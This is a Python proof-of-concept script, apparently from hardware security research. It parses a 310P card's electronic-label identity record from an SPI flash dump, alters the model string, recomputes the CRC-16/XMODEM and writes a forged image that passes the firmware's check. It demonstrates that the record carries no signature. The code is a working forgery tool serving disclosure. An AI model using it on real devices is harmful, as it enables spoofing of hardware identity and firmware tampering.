#!/usr/bin/env python3
"""Forge an MCU electronic-label record for the 310P and prove the CRC-only
integrity claim.

The electronic label is the card's board-identity record.  The MCU firmware
verifies it with a CRC-16/XMODEM over each item's payload -- no signature:

    elabel_init (0x08049aa4):
        0x08049b8a  ldrh sl, [r8, r3]      ; expected CRC from the item header
        0x08049b8e  bl   0x805b2c0         ; crc16 over (r8+r3+4), length r1
        0x08049b92  cmp  sl, r0
        0x08049b94  bne  -> "fail to read and verify elabel."

so an item is [u16 crc][u16 len][payload], with the CRC computed over the
payload only.  This script:

  1. parses the real elabel out of the card's SPI flash dump,
  2. changes one item's payload (the model string),
  3. recomputes the CRC,
  4. re-verifies the whole record with the same algorithm the firmware uses.

A successful re-verification with a modified payload is the proof that the
elabel's integrity mechanism is a checksum and not a signature: anyone able to
write the region can produce a record the firmware accepts.

Usage:
    python3 mcu_elabel_forge.py <16MB-flash-dump>            # analyse only
    python3 mcu_elabel_forge.py <16MB-flash-dump> --forge    # also forge
"""
import struct
import sys

MCU_IMAGE_BASE = 0x08028000
ELABEL_ITEM_TABLE = 0x0802AED8
DEFAULT_BALE = 0x2C0000
MCU_IMAGE_FLASH_OFFSET = 0x220000


def crc16_xmodem(data):
    """CRC-16/XMODEM: poly 0x1021, init 0x0000, no reflection, no final xor."""
    crc = 0
    for byte in data:
        crc ^= byte << 8
        for _ in range(8):
            crc = ((crc << 1) ^ 0x1021) & 0xFFFF if crc & 0x8000 else (crc << 1) & 0xFFFF
    return crc


def load_items(mcu_image):
    offset = ELABEL_ITEM_TABLE - MCU_IMAGE_BASE
    items = []
    for index in range(64):
        base = offset + index * 0x10
        if base + 16 > len(mcu_image):
            break
        w0, w1, w2, _w3 = struct.unpack_from("<4I", mcu_image, base)
        if w1 == 0 and w2 == 0:
            break
        items.append({"index": index, "id": w0 & 0xFFFF, "maxlen": w1 & 0xFFFF,
                      "offset": w2})
    return items


def verify(flash, items, bale):
    """Return (all_ok, per-item results)."""
    results = []
    ok_all = True
    for item in items:
        pos = bale + item["offset"]
        if pos + 4 > len(flash):
            continue
        crc = struct.unpack_from("<H", flash, pos)[0]
        length = struct.unpack_from("<H", flash, pos + 2)[0]
        payload = flash[pos + 4:pos + 4 + length]
        calc = crc16_xmodem(payload) if length else 0
        ok = crc == calc and length <= item["maxlen"]
        ok_all = ok_all and ok
        results.append((item, crc, length, calc, ok, payload))
    return ok_all, results


def main():
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    if not args:
        print(__doc__)
        return 2
    with open(args[0], "rb") as fh:
        flash = bytearray(fh.read())

    mcu_image = bytes(flash[MCU_IMAGE_FLASH_OFFSET:MCU_IMAGE_FLASH_OFFSET + 0x40000])
    items = load_items(mcu_image)
    bale = DEFAULT_BALE

    print(f"elabel record base : 0x{bale:08x}  magic={bytes(flash[bale:bale + 4])!r}")
    ok, results = verify(flash, items, bale)
    print(f"baseline verification: {'ALL OK' if ok else 'FAILED'} "
          f"({sum(1 for r in results if r[4])}/{len(results)} items)\n")

    for item, crc, length, calc, item_ok, payload in results:
        if payload:
            print(f"  id=0x{item['id']:04x} off=0x{item['offset']:04x} "
                  f"crc=0x{crc:04x} len={length:3d} {payload!r}")

    if "--forge" not in sys.argv:
        print("\n(re-run with --forge to demonstrate a CRC-valid modification)")
        return 0 if ok else 1

    # Forge: change the model string (item id 0x0022) and recompute its CRC.
    target = None
    for item, _crc, _len, _calc, _ok, payload in results:
        if payload == b"IT21PD2G10":
            target = item
            break
    if target is None:
        print("\nmodel item not found -- nothing to forge")
        return 1

    new_payload = b"IT21PD2G10"
    pos = bale + target["offset"]
    print(f"\n=== forging item id=0x{target['id']:04x} at 0x{pos:06x} ===")
    print(f"    original payload : {new_payload!r} (crc 0x{struct.unpack_from('<H', flash, pos)[0]:04x})")

    # A minimal, meaningful change: same length, one character differs.
    forged = bytearray(new_payload)
    forged[-1] = ord("1")
    new_crc = crc16_xmodem(forged)
    print(f"    forged payload   : {bytes(forged)!r}")
    print(f"    new CRC-16/XMODEM: 0x{new_crc:04x}")

    # Apply: [u16 crc][u16 len][payload]
    struct.pack_into("<H", flash, pos, new_crc)
    struct.pack_into("<H", flash, pos + 2, len(forged))
    flash[pos + 4:pos + 4 + len(forged)] = forged

    ok2, results2 = verify(flash, items, bale)
    print(f"\n    re-verify whole record: {'ALL OK' if ok2 else 'FAILED'} "
          f"({sum(1 for r in results2 if r[4])}/{len(results2)} items)")
    for item, crc, length, calc, item_ok, payload in results2:
        if payload and item["id"] == target["id"]:
            print(f"    item now: crc=0x{crc:04x} calc=0x{calc:04x} "
                  f"{'VALID' if item_ok else 'INVALID'} payload={payload!r}")

    print("\nThe firmware's check is a 16-bit checksum.  A modified payload with a")
    print("recomputed CRC passes elabel_init's verification unchanged -- there is")
    print("no signature over the record.")

    out = "elabel_forged.bin"
    with open(out, "wb") as fh:
        fh.write(flash)
    print(f"\nforged image written to {out} ({len(flash)} bytes)")
    return 0 if ok2 else 1


if __name__ == "__main__":
    sys.exit(main())
